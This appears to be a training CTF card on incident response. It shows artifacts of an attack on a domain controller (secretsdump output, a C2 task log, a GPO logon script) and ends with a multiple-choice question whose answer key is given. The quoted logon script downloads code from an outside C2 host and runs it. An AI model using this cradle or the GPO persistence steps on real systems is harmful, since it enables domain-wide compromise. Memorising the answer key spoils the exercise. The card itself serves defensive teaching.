![image](/FilesForLabs/images/blueantisyphon.png)

# Hard CTF - Domain-Wide Persistence

Your incident response team is called in after an alert fires on a domain controller. You pull the following artifacts during your investigation.

**Impacket log excerpt (secretsdump output found in attacker's working directory):**
```
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Mythic C2 callback log (recovered from attacker's server):**
```
[2024-11-10 03:42:11] Agent checkin: CORP-DC01 | user: SYSTEM
[2024-11-10 03:42:14] Task: upload logon_patch.ps1 to SYSVOL
[2024-11-10 03:42:19] Task: modify GPO IT_Security_Baseline - add logon script
[2024-11-10 03:42:25] Task: link GPO to domain root
```

**SYSVOL script content (`logon_patch.ps1`):**
```powershell
$c2 = "https://185.220.xx.xx/update"
$r = Invoke-WebRequest -Uri $c2 -UseBasicParsing
Invoke-Expression $r.Content
```

**Timeline summary:**
- `03:41` - Attacker authenticates to DC using dumped hash (pass-the-hash)
- `03:42` - C2 agent deployed as SYSTEM
- `03:42` - SYSVOL modified, GPO updated with malicious logon script
- `03:45` d First non-DC machine checks in to C2 after user login

---

## Question

Given all the evidence above, what is the correct sequence of events that led to domain-wide compromise?

---

## Flags (Choose One)

- **A)** The attacker phished a user, gained local admin, then escalated through a kernel exploit to reach the domain controller
- **B)** The attacker brute-forced the domain admin password, then manually copied a script to each machine's startup folder
- **C)** The attacker used a previously dumped hash to authenticate to the DC, deployed a C2 agent as SYSTEM, modified a GPO to add a malicious logon script to SYSVOL, and achieved persistent code execution across the entire domain
- **D)** A misconfigured scheduled task on the DC caused a legitimate script to be replicated incorrectly to all machines through SYSVOL

---

Correct Flag: **C**

---

# Finished?
[Back to Card's Main Page](../Logon_Scripts.md)
